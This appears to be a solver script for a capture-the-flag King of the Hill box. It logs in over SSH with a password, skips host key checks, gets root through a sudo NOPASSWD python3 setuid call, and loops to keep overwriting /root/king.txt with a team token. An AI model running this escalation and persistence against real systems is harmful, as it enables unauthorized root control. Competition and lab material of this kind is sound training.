#!/usr/bin/env bash
# Reference holder for The Foundry (boot2root KotH). Needs `sshpass`.
#   ./solve.sh HOST PORT <team_token> [password]
# Privesc: sudo NOPASSWD python3. Then hold at ROOT level (full points).
set -euo pipefail
HOST="${1:?usage: solve.sh HOST PORT <team_token> [password]}"; PORT="${2:?port}"
TOKEN="${3:?team token (CTFd King of the Hill page)}"; PW="${4:-player}"
sshpass -p "$PW" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -p "$PORT" "player@$HOST" \
  "sudo python3 -c 'import os,time; os.setuid(0); print(\"[+] root=%d\"%os.getuid());
open(\"/root/king.txt\",\"w\").write(\"$TOKEN\")
import itertools
while True:
    open(\"/root/king.txt\",\"w\").write(\"$TOKEN\"); time.sleep(15)'"
